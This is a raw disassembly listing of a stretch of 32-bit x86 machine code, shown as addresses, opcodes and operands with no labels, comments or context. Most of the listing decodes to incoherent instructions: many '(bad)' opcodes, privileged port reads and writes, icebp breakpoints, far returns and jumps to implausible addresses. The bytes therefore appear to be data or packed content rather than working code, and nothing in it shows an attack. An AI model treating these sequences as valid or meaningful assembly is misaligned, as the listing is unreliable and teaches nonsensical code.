  431af2:	add    bh,BYTE PTR [ebp+0x0]
  431af5:	add    ebx,DWORD PTR [ebp-0x77]
  431af8:	mov    edi,eax
  431afa:	cmp    al,0x0
  431afd:	adc    dh,BYTE PTR [ebx]
  431aff:	jge    0x431b04
  431b01:	mov    edi,DWORD PTR [ebx]
  431b03:	jl     0x431b14
  431b05:	clc    
  431b06:	dec    edi
  431b07:	jge    0x431b09
  431b09:	mov    eax,DWORD PTR [ebx]
  431b0b:	jb     0x431b15
  431b0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b10:	mov    edi,edi
  431b12:	xor    edx,DWORD PTR [eax]
  431b14:	add    edi,DWORD PTR [ebx]
  431b16:	mov    DWORD PTR [ebp-0x10],edi
  431b19:	inc    edi
  431b1a:	pop    ebp
  431b1b:	jge    0x431b58
  431b1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431b21:	mov    edx,0xc05d87f0
  431b26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431b2a:	fimul  WORD PTR [eax]
  431b2c:	fist   WORD PTR [ebp+0x1c]
  431b2f:	in     al,dx
  431b30:	jne    0x431b1e
  431b32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431b38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b3c:	fdivp  st(0),st
  431b3e:	fild   WORD PTR [ebp+0x4510f85c]
  431b44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b4a:	inc    ebp
  431b4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b51:	mov    ebp,DWORD PTR [ebx-0x4]
  431b54:	adc    al,0x8b
  431b56:	rcl    DWORD PTR [eax],0x48
  431b59:	mov    esi,0x7080803
  431b5e:	fiadd  WORD PTR [ebp+0x4d]
  431b61:	(bad)  
  431b62:	mov    edx,DWORD PTR [edx-0x4]
  431b65:	mov    edx,DWORD PTR [ebp-0x4]
  431b68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b6e:	mov    DWORD PTR [edi+0x872dc],edi
  431b74:	xlat   BYTE PTR ds:[ebx]
  431b75:	into   
  431b76:	ffreep st(6)
  431b78:	retf   0x6c7
  431b7b:	iret   
  431b7c:	dec    ebp
  431b7d:	inc    ebp
  431b7e:	mov    DWORD PTR [ebx],edi
  431b80:	fmul   QWORD PTR [edi]
  431b82:	dec    ebp
  431b83:	jnp    0x431bb8
  431b85:	add    BYTE PTR [ebx],al
  431b87:	mov    ecx,DWORD PTR [esp+edi*8]
  431b8a:	inc    ebp
  431b8b:	dec    ebp
  431b8c:	lea    esi,[ebx]
  431b8e:	add    DWORD PTR [ebx],eax
  431b90:	jb     0x431bcd
  431b92:	add    BYTE PTR [edi],cl
  431b94:	inc    ebp
  431b95:	imul   eax,edi,0x858bd800
  431b9b:	cld    
  431b9c:	clc    
  431b9d:	mov    DWORD PTR [ebp+0x0],eax
  431ba0:	inc    DWORD PTR [eax]
  431ba2:	or     al,0xde
  431ba4:	sbb    bh,0x1
  431ba7:	retf   
  431ba8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431baf:	dec    ebp
  431bb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431bb6:	enter  0x12de,0xdf
  431bba:	inc    ebp
  431bbb:	pop    ebp
  431bbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431bc2:	add    DWORD PTR [edx],edx
  431bc4:	add    BYTE PTR [ebp+0x50],dl
  431bc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431bcd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431bd3:	or     ah,al
  431bd5:	pop    ss
  431bd6:	cdq    
  431bd7:	push   ebp
  431bd8:	clc    
  431bd9:	mov    eax,DWORD PTR [ebp-0x4]
  431bdc:	xor    edx,edx
  431bde:	add    esi,DWORD PTR [ebx]
  431be0:	cmp    eax,DWORD PTR [ebx]
  431be2:	hlt    
  431be3:	cmp    DWORD PTR [ebx],esp
  431be5:	or     al,BYTE PTR [ebp+0xf]
  431be8:	mov    eax,DWORD PTR [edx]
  431bea:	loopne 0x431bec
  431bec:	(bad)  
  431bed:	mov    ecx,esi
  431bef:	cld    
  431bf0:	pushf  
  431bf1:	pop    ebp
  431bf2:	fwait
  431bf3:	mov    esi,DWORD PTR [edx]
  431bf5:	lock mov eax,eax
  431bf8:	adc    BYTE PTR [ebx],al
  431bfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c07:	dec    ebp
  431c08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c0e:	(bad)  
  431c0f:	iret   
  431c10:	inc    ebp
  431c11:	(bad)  
  431c12:	jne    0x431c61
  431c14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c1a:	(bad)  
  431c1b:	cmp    ebx,eax
  431c1d:	je     0x431ba5
  431c1f:	add    edi,edi
  431c21:	or     bh,bh
  431c23:	dec    ebp
  431c24:	inc    ebp
  431c25:	mov    esi,DWORD PTR [ebx]
  431c27:	cld    
  431c28:	add    ecx,esi
  431c2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431c2d:	mov    edx,DWORD PTR [edi]
  431c2f:	or     BYTE PTR [ebp-0x7c],al
  431c32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431c38:	test   BYTE PTR [ebx+ebx*4],cl
  431c3b:	inc    ebp
  431c3c:	xor    bh,BYTE PTR [esi]
  431c3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c45:	jne    0x431c0e
  431c47:	mov    ebp,esp
  431c49:	fcomp  DWORD PTR [ebx]
  431c4b:	add    BYTE PTR [ecx],al
  431c4d:	inc    DWORD PTR [ebp-0x75]
  431c50:	(bad)  
  431c51:	cld    
  431c52:	add    al,0xce
  431c54:	mov    ecx,edi
  431c56:	cld    
  431c57:	inc    ebp
  431c58:	fidivr WORD PTR [ebx]
  431c5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431c5d:	mov    eax,DWORD PTR [eax]
  431c5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c65:	fadd   st,st(7)
  431c67:	add    BYTE PTR [ebp-0x1],al
  431c6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431c6d:	inc    ebp
  431c6e:	mov    bh,0xc7
  431c71:	loopne 0x431cb8
  431c73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c79:	sbb    dh,BYTE PTR [ebx]
  431c7b:	pushf  
  431c7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c82:	mov    eax,edi
  431c84:	cwde   
  431c85:	inc    ebp
  431c86:	inc    ebp
  431c87:	jne    0x431c14
  431c89:	mov    esp,esp
  431c8b:	clc    
  431c8c:	add    al,0x4d
  431c8e:	mov    DWORD PTR [ebx],esi
  431c90:	or     al,0x33
  431c92:	inc    ebp
  431c93:	lea    ecx,[ebx-0x398d13fd]
  431c99:	add    bh,al
  431c9b:	inc    ebp
  431c9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431ca3:	add    ebp,esp
  431ca5:	shufps xmm1,xmm3,0xc7
  431ca9:	(bad)  
  431caa:	jmp    0x748857d3
  431caf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431cb5:	hlt    
  431cb6:	mov    ecx,DWORD PTR [edi]
  431cb8:	fadd   DWORD PTR [ebp+0x0]
  431cbb:	xor    ecx,DWORD PTR [edi]
  431cbd:	add    ecx,ecx
  431cbf:	cmp    edi,edi
  431cc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431cc5:	(bad)  
  431cc6:	jmp    0x431c53
  431cc8:	mov    edi,esp
  431cca:	or     al,0xc6
  431ccc:	inc    ebp
  431ccd:	(bad)  
  431cce:	mov    eax,DWORD PTR [ebp+0x10]
  431cd1:	jne    0x431c5c
  431cd3:	mov    eax,DWORD PTR [ecx]
  431cd5:	clc    
  431cd6:	add    BYTE PTR [ebp-0x40],cl
  431cd9:	xor    edx,DWORD PTR [eax-0x73]
  431cdc:	jne    0x431cdf
  431cde:	push   DWORD PTR [edx+0x8]
  431ce1:	add    BYTE PTR [ebp+0x45],al
  431ce4:	mov    ebp,ecx
  431ce6:	cld    
  431ce7:	add    BYTE PTR [ebp+0x0],cl
  431cea:	xor    eax,DWORD PTR [ebp+0x3]
  431ced:	mov    DWORD PTR [ebx],edi
  431cef:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cf5:	sub    eax,0x5d330e4d
  431cfa:	lea    esi,[ebx]
  431cfc:	add    DWORD PTR [ebx],eax
  431cfe:	jb     0x431ce9
  431d00:	add    BYTE PTR [eax],al
  431d02:	inc    ebp
  431d03:	add    bl,ch
  431d05:	inc    ebp
  431d06:	mov    esi,DWORD PTR [ebx]
  431d08:	or     al,0x3
  431d0a:	(bad)  
  431d0b:	mov    edi,eax
  431d0d:	in     al,dx
  431d0e:	scas   eax,DWORD PTR es:[edi]
  431d0f:	inc    ebp
  431d10:	mov    esi,DWORD PTR [ebx]
  431d12:	in     al,0x3
  431d14:	add    al,0x89
  431d16:	mov    ecx,DWORD PTR [eax+edi*8]
  431d19:	dec    ebp
  431d1a:	(bad)  
  431d1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431d22:	mov    ecx,eax
  431d24:	cld    
  431d25:	push   es
  431d26:	dec    ebp
  431d27:	add    al,0x33
  431d29:	mov    DWORD PTR [ebx],eax
  431d2b:	in     al,dx
  431d2c:	cmp    DWORD PTR [ebp-0x67],eax
  431d2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431d35:	mov    edx,DWORD PTR [ebp-0x4]
  431d38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431d3b:	xor    eax,DWORD PTR [ebp+0x3]
  431d3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431d44:	xor    edi,esp
  431d46:	jmp    0xff771a98
  431d4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431d4e:	xor    ebx,DWORD PTR [edi]
  431d50:	add    eax,ecx
  431d52:	cmp    ebx,DWORD PTR [eax]
  431d54:	mov    ecx,DWORD PTR [ebp-0x4]
  431d57:	mov    ecx,DWORD PTR [eax]
  431d59:	adc    BYTE PTR [ebp-0x80],al
  431d5c:	jmp    0x431d5f
  431d5e:	mov    eax,DWORD PTR [eax]
  431d60:	cld    
  431d61:	mov    bh,0xc6
  431d63:	push   ecx
  431d64:	(bad)  
  431d65:	jne    0x431dc5
  431d67:	dec    ecx
  431d69:	or     BYTE PTR [ecx+ebx*1],cl
  431d6c:	push   ebp
  431d6d:	inc    ebp
  431d6e:	in     al,dx
  431d6f:	add    ebp,esp
  431d71:	or     bh,al
  431d73:	dec    ebp
  431d74:	cld    
  431d75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d7b:	xor    DWORD PTR [edx],0x2
  431d7e:	pushf  
  431d7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431d85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d8b:	mov    edx,DWORD PTR [ecx+0xc]
  431d8e:	xor    eax,esi
  431d90:	mov    edx,0xc172c7
  431d95:	inc    ebp
  431d96:	mov    esi,DWORD PTR [ebp+0x8]
  431d99:	mov    eax,edx
  431d9b:	call   0x84c7e490
  431da0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431da6:	mov    ebp,eax
  431da8:	or     BYTE PTR [eax],dl
  431daa:	jo     0x431df9
  431dac:	push   edi
  431dad:	xor    esi,DWORD PTR [ebp+0x3]
  431db0:	(bad)  
  431db1:	pmulhuw mm0,mm1
  431db4:	test   DWORD PTR [ebp-0x8],ecx
  431db7:	mov    DWORD PTR [ebp-0x67],eax
  431dba:	mov    eax,DWORD PTR [ebp-0x4]
  431dbd:	xor    edi,DWORD PTR [ebp-0x73]
  431dc0:	xor    eax,DWORD PTR [ebx]
  431dc2:	xor    esi,DWORD PTR [edx+0x3]
  431dc5:	add    BYTE PTR [ecx],bh
  431dc7:	inc    ebp
  431dc8:	(bad)  
  431dc9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431dcf:	mov    DWORD PTR [eax],0x750f0004
  431dd5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431ddb:	lock add BYTE PTR [ebp+0x0],cl
  431ddf:	mov    esi,DWORD PTR [ebp-0x18]
  431de2:	mov    ebp,edx
  431de4:	or     al,0x72
  431de6:	ja     0x431de8
  431de8:	mov    edx,esi
  431dea:	cld    
  431deb:	(bad)  
  431dee:	cli    
  431def:	mov    esi,DWORD PTR [ebp-0x4]
  431df2:	cmp    ecx,esi
  431df4:	bswap  edi
  431df6:	(bad)
  431dfa:	mov    esi,DWORD PTR [ebp-0x4]
  431dfd:	mov    esi,ecx
  431dff:	clc    
  431e00:	repnz add esi,DWORD PTR [ebp+0x45]
  431e04:	push   ebx
  431e05:	xor    eax,DWORD PTR [ebp+0x3]
  431e08:	cmp    al,0x5f
  431e0a:	pushf  
  431e0b:	pop    ebx
  431e0c:	jmp    0x431ed3
  431e11:	mov    esi,DWORD PTR [ebp-0x7d]
  431e14:	xor    ebp,DWORD PTR [eax]
  431e16:	lea    eax,[ebp-0x8]
  431e19:	xor    edx,esi
  431e1b:	pushf  
  431e1c:	out    dx,eax
  431e1d:	(bad)  
  431e1e:	neg    eax
  431e20:	ins    DWORD PTR es:[edi],dx
  431e21:	test   esi,edi
  431e23:	clc    
  431e24:	pop    esp
  431e25:	inc    ebp
  431e26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431e2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431e32:	add    cl,al
  431e34:	jne    0x431dd1
  431e36:	mov    esi,DWORD PTR [edx]
  431e38:	in     al,dx
  431e39:	push   esi
  431e3a:	xor    BYTE PTR [ebp-0xe],dh
  431e3d:	add    edi,esi
  431e3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e45:	add    cl,bh
  431e47:	mov    edi,DWORD PTR [ebp+0x8]
  431e4a:	mov    DWORD PTR [ebp-0x14],esi
  431e4d:	add    esi,DWORD PTR [ebp+0x3c]
  431e50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e56:	mov    ah,0x3e
  431e58:	fwait
  431e59:	pushf  
  431e5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431e60:	jne    0x431ded
  431e62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431e65:	icebp  
  431e66:	icebp  
  431e67:	shl    edx,0xf2
  431e6a:	(bad)  
  431e6b:	mov    ah,0x16
  431e6d:	push   eax
  431e6e:	jne    0x431e03
  431e70:	mov    ecx,DWORD PTR [edi]
  431e72:	in     al,dx
  431e73:	jmp    0x431e66
  431e75:	add    dl,dh
  431e77:	mov    edi,esi
  431e79:	or     al,0x8
  431e7b:	inc    ebp
  431e7c:	jne    0x431e81
  431e7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e84:	ret    
  431e85:	or     bh,bh
  431e87:	jge    0x431e71
  431e89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e8f:	xor    edi,eax
  431e91:	add    esi,DWORD PTR [ebp-0x77]
  431e94:	mov    ebx,esp
  431e96:	clc    
  431e97:	neg    DWORD PTR [ebp-0x7c]
  431e9a:	xor    eax,DWORD PTR [eax]
  431e9c:	cmp    eax,DWORD PTR [eax]
  431e9e:	repz jne 0x431e36
  431ea1:	xor    eax,DWORD PTR [ecx]
  431ea3:	add    ebx,DWORD PTR [eax]
  431ea5:	mov    DWORD PTR [ebp-0x8],eax
  431ea8:	mov    eax,edi
  431eaa:	cld    
  431eab:	lock pop eax
  431ead:	test   DWORD PTR [ebx],esi
  431eaf:	clc    
  431eb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431eb6:	fdivp  st(4),st
  431eb8:	test   ecx,esi
  431eba:	(bad)  
  431ebb:	jnp    0x431ebc
  431ebd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431ec3:	jae    0x431e50
  431ec5:	sub    edi,esp
  431ec7:	(bad)  
  431ec8:	shl    DWORD PTR [eax-0x3e],0x89
  431ecc:	leave  
  431ecd:	call   0x8198d5da
  431ed2:	in     al,dx
  431ed3:	(bad)  
  431ed4:	in     al,dx
  431ed5:	add    bh,al
  431ed7:	mov    esp,edi
  431ed9:	in     al,dx
  431eda:	test   DWORD PTR [ebp-0x8],edi
  431edd:	mov    eax,DWORD PTR [ebp+0x2b]
  431ee0:	xor    al,BYTE PTR [ebx]
  431ee2:	pushf  
  431ee3:	jnp    0x57321b1c
  431ee9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431eed:	loopne 0x431f22
  431eef:	jne    0x431eac
  431ef1:	mov    esi,DWORD PTR [edx-0x20]
  431ef4:	add    BYTE PTR [ebp-0x3d],bh
  431ef7:	xor    eax,DWORD PTR [ebp-0x73]
  431efa:	mov    edi,DWORD PTR [esi]
  431efc:	cld    
  431efd:	jb     0x431ec5
  431eff:	add    bl,al
  431f01:	jne    0x431f48
  431f03:	mov    edx,DWORD PTR [edi-0x10]
  431f06:	jge    0x431f85
  431f08:	mov    esi,DWORD PTR [ebx]
  431f0a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f0e:	xor    esi,DWORD PTR [ebp-0x77]
  431f11:	mov    esi,eax
  431f13:	lock inc ebp
  431f15:	jge    0x431f48
  431f17:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f1e:	dec    ebp
  431f1f:	mov    esi,DWORD PTR [ebx]
  431f21:	loopne 0x431eac
  431f23:	jge    0x431f1d
  431f25:	add    DWORD PTR [ebp-0x7d],eax
  431f28:	icebp  
  431f29:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431f30:	dec    ebp
  431f31:	hlt    
  431f32:	xor    ebx,DWORD PTR [ebp-0x77]
  431f35:	mov    esi,esp
  431f37:	in     al,0x45
  431f39:	jge    0x431f78
  431f3b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f42:	dec    ebp
  431f43:	push   esp
  431f44:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f4a:	inc    ebp
  431f4b:	hlt    
  431f4c:	xor    DWORD PTR [ebp-0x61],esi
  431f4f:	mov    edi,DWORD PTR [eax+0xf19504]
  431f55:	repnz mov DWORD PTR [ebp+0x20],ebx
  431f59:	cmp    eax,DWORD PTR [ebp+0xf]
  431f5c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f60:	fistp  WORD PTR [ebx+0x0]
  431f63:	inc    ebp
  431f64:	mov    ebx,DWORD PTR [edi+0xc]
  431f67:	add    eax,eax
  431f69:	inc    ebp
  431f6a:	test   BYTE PTR [ebx],dh
  431f6c:	add    eax,DWORD PTR [ebx]
  431f6e:	add    BYTE PTR [esi+0x45],bl
  431f71:	ret    0x85
  431f74:	jnp    0x5443a343
  431f7a:	inc    bp
  431f7c:	inc    ebp
  431f7d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f83:	fdiv   QWORD PTR [ebx]
  431f85:	test   DWORD PTR [ecx+0x453bf8],edi
  431f8b:	push   ebx
  431f8c:	add    edi,DWORD PTR [esi+0x708088b]
  431f92:	cmp    esi,eax
  431f94:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f9b:	mov    esp,edi
  431f9d:	call   0x33ce64ef
  431fa2:	or     BYTE PTR [ebx],al
  431fa4:	inc    ecx
  431fa5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431fab:	and    BYTE PTR [ebp-0x7074f0bb],al
  431fb1:	lock add cl,al
  431fb4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431fbb:	mov    ch,0x45
  431fbd:	clc    
  431fbe:	xor    eax,DWORD PTR [ebp+0x3]
  431fc1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431fc7:	inc    ebp
  431fc8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431fce:	mov    edi,eax
  431fd0:	mov    eax,DWORD PTR [ebp+0x3c]
  431fd3:	mov    ecx,DWORD PTR [eax]
  431fd5:	hlt    
  431fd6:	inc    ebp
  431fd7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fde:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fe4:	push   ebp
  431fe5:	mov    edi,DWORD PTR [ebx]
  431fe7:	in     al,dx
  431fe8:	jne    0x431fab
  431fea:	mov    eax,DWORD PTR [ebp-0x28]
  431fed:	add    DWORD PTR [eax],0xe8058dec
  431ff3:	clc    
  431ff4:	mov    esi,DWORD PTR [edi-0x8]
  431ff7:	add    dh,dl
  431ff9:	rol    WORD PTR [ebp-0x1],cl
  431ffd:	mov    edx,DWORD PTR [eax+0x8]
  432000:	jne    0x431fc2
  432002:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432009:	inc    ebp
  43200a:	push   esp
  43200b:	test   DWORD PTR [ecx+0xf],ecx
  43200e:	sub    edx,esp
  432010:	add    eax,DWORD PTR [eax]
  432012:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432018:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43201f:	mov    eax,DWORD PTR [ecx]
  432021:	and    BYTE PTR [eax],al
  432023:	cmp    al,0x10
  432025:	add    BYTE PTR [ebp+0x66],al
  432028:	inc    ecx
  43202a:	push   esp
  43202b:	add    dh,BYTE PTR [ebp+0x0]
  43202e:	push   edx
  43202f:	enterw 0xc1,0x4d
  432034:	mov    esp,DWORD PTR [esi+0x20]
  432037:	add    DWORD PTR [ecx-0x7b],eax
  43203a:	add    eax,DWORD PTR [ebx]
  43203c:	str    WORD PTR [eax+0x45]
  432040:	lea    ecx,[ebx+0x45890801]
  432046:	sbb    BYTE PTR [ebx],al
  432048:	dec    ebp
  432049:	cmp    al,0xf
  43204b:	inc    ebp
  43204c:	push   eax
  43204d:	mov    esi,DWORD PTR [ebx]
  43204f:	push   eax
  432050:	add    eax,eax
  432052:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432059:	inc    ebp
  43205a:	add    BYTE PTR [ecx],dh
  43205c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432063:	(bad)  
  432064:	mov    ebx,eax
  432066:	loopne 0x4320ad
  432068:	dec    ebp
  432069:	mov    ecx,DWORD PTR [edi]
  43206b:	cld    
  43206c:	push   eax
  43206d:	xchg   DWORD PTR [ebx],esi
  43206f:	add    DWORD PTR [ebx],ebp
  432071:	add    BYTE PTR [ebx],ch
  432073:	or     BYTE PTR [ecx],bh
  432075:	dec    ecx
  432076:	loopne 0x43207b
  432078:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43207e:	push   ebp
  43207f:	add    DWORD PTR [ebx+0x55100800],eax
  432085:	dec    ebp
  432086:	jmp    0x432011
  432088:	mov    esp,DWORD PTR [eax]
  43208a:	sbb    dl,dl
  43208c:	inc    eax
  43208d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432093:	add    BYTE PTR [ebx+0x74528555],cl
  432099:	push   ebp
  43209a:	div    DWORD PTR [ebx]
  43209c:	and    eax,DWORD PTR [ebx]
  43209e:	add    edx,DWORD PTR [edx-0x30]
  4320a1:	jno    0x43202e
  4320a3:	inc    DWORD PTR [eax+eiz*1]
  4320a6:	inc    ebp
  4320a7:	push   eax
  4320a8:	push   eax
  4320a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4320af:	mov    edi,esp
  4320b1:	push   eax
  4320b2:	inc    ebp
  4320b3:	enter  0x458b,0x8
  4320b7:	push   ecx
  4320b8:	(bad)  
  4320b9:	call   0x10d2a91
  4320be:	pop    ss
  4320bf:	push   ebp
  4320c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4320c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4320cc:	push   ecx
  4320cd:	jo     0x4320b7
  4320cf:	inc    DWORD PTR [edi]
  4320d1:	or     BYTE PTR [eax],al
  4320d3:	call   0xce281d
  4320d8:	fmul   QWORD PTR [ebp+0x55]
  4320db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320e1:	mov    bh,0x8c
  4320e3:	adc    al,0x9b
  4320e5:	dec    esp
  4320e6:	xor    bl,BYTE PTR [eax]
  4320e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4320eb:	mov    eax,DWORD PTR [ebp-0x4]
  4320ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320f4:	push   es
  4320f5:	retf   
  4320f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4320fa:	inc    ebp
  4320fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432102:	retf   0x83fc
  432105:	into   
  432106:	dec    ebp
  432107:	retf   
  432108:	mov    ecx,DWORD PTR [ebp-0x74]
  43210b:	mov    eax,DWORD PTR [eax]
  43210d:	fdiv   QWORD PTR [ebx]
  43210f:	mov    bh,0x3
  432111:	push   es
  432112:	mov    esi,ecx
  432114:	sbb    cl,dl
  432116:	dec    ebp
  432117:	sar    DWORD PTR [ebx],cl
  432119:	push   ebp
  43211a:	jne    0x43212b
  43211c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432122:	lea    ebx,[eax]
  432124:	call   0xf4ccaceb
  432129:	sbb    dh,dl
  43212b:	add    edx,ebx
  43212d:	push   ebp
  43212e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432134:	push   ecx
  432135:	mov    DWORD PTR [eax-0x30],edx
  432138:	test   DWORD PTR [edx],eax
  43213a:	xadd   esp,esi
  43213d:	pop    es
  43213e:	add    cl,dl
  432140:	mov    eax,ecx
  432142:	or     al,0x45
  432144:	(bad)  
  432145:	push   eax
  432146:	add    DWORD PTR [edx+0x0],eax
  432149:	add    ecx,DWORD PTR [ecx]
  43214b:	and    dh,cl
  43214d:	call   0xc72a1d
  432152:	add    DWORD PTR [ebp+0x0],edx
  432155:	mov    esp,DWORD PTR [ebp+0x18]
  432158:	add    BYTE PTR [eax+0x50],cl
  43215b:	xor    eax,DWORD PTR [eax]
  43215d:	add    esp,DWORD PTR [esi+0x3b]
  432160:	inc    ebp
  432161:	je     0x4320e6
  432163:	push   ecx
  432164:	dec    BYTE PTR [ebp-0x77]
  432167:	add    eax,esi
  432169:	or     al,0x5e
  43216b:	inc    eax
  43216c:	add    BYTE PTR [ebx],al
  43216e:	data16 and BYTE PTR [ebp+0x50],al
  432172:	sub    DWORD PTR [ecx],0xfffffff8
  432175:	add    BYTE PTR [ebp-0x75],ah
  432178:	add    BYTE PTR [eax],bl
  43217a:	enter  0x894d,0x8b
  43217e:	int3   
  43217f:	loopne 0x432143
  432181:	rol    BYTE PTR [eax],0x33
  432184:	lea    cx,[ebp+0xa]
  432188:	data16 jb 0x4321d0
  43218b:	add    BYTE PTR [ebx+0x44890855],cl
  432191:	sbb    ah,al
  432193:	inc    ebp
  432194:	cmp    al,0xf
  432196:	add    BYTE PTR [edx+0x66],dl
  432199:	xor    ecx,DWORD PTR [eax]
  43219b:	sub    eax,DWORD PTR [edx]
  43219d:	mov    eax,DWORD PTR [eax]
  43219f:	or     al,0x66
  4321a1:	ror    edx,cl
  4321a3:	dec    ebp
  4321a4:	inc    ebp
  4321a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4321ab:	cld    
  4321ac:	or     BYTE PTR [edi+0x4501dd],dl
  4321b2:	ret    0xecce
  4321b5:	retf   
  4321b6:	(bad)  
  4321b7:	dec    ebp
  4321b8:	mov    al,0x8b
  4321ba:	loopne 0x4321dc
  4321bc:	cmp    ecx,DWORD PTR [edx]
  4321be:	inc    ebp
  4321bf:	daa    
  4321c0:	loopne 0x432149
  4321c2:	in     al,dx
  4321c3:	add    edi,eax
  4321c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4321cb:	push   ebp
  4321cc:	inc    ebp
  4321cd:	xor    ebx,edx
  4321cf:	add    ebp,esp
  4321d1:	push   edx
  4321d2:	push   bp
  4321d4:	inc    ebp
  4321d5:	(bad)  
  4321d6:	in     eax,dx
  4321d7:	push   esp
  4321d8:	(bad)  
  4321d9:	inc    edx
  4321db:	sbb    al,0x33
  4321dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321e4:	add    BYTE PTR [ebp+0x46],0x8b
  4321e8:	jmp    0xf98b:0x100041c8
  4321ef:	xor    esi,DWORD PTR [edx+0x3]
  4321f2:	mov    ecx,DWORD PTR [edi]
  4321f4:	fmul   DWORD PTR [edx]
  4321f6:	add    BYTE PTR [eax],al
  4321f8:	lea    eax,[ebx-0x4700273c]
  4321fe:	add    al,0x4f
  432200:	pop    DWORD PTR [eax]
  432202:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432208:	push   edx
  432209:	inc    WORD PTR [ebp+0x8]
  43220d:	mov    eax,0x514f4d
  432212:	(bad)
  432216:	add    al,al
  432218:	xor    DWORD PTR [ebx-0x74baf730],eax
  43221e:	test   DWORD PTR [esi+0x74],esp
  432221:	inc    ebp
  432222:	mov    DWORD PTR [eax+0xa4e08],edi
  432228:	add    BYTE PTR [ecx-0x76c435bb],cl
  43222e:	or     dh,cl
  432230:	or     eax,0x8b8d5045
  432235:	inc    ebp
  432236:	mov    WORD PTR [ecx+0x3b8a00],?
  43223c:	jne    0x432271
  43223e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432244:	add    DWORD PTR [ebx],eax
  432246:	add    bh,bh
  432248:	adc    DWORD PTR [eax],ecx
  43224a:	adc    DWORD PTR [ebp+0x55],edi
  43224d:	push   es
  43224e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432254:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43225b:	inc    ebp
  43225c:	mov    esp,edi
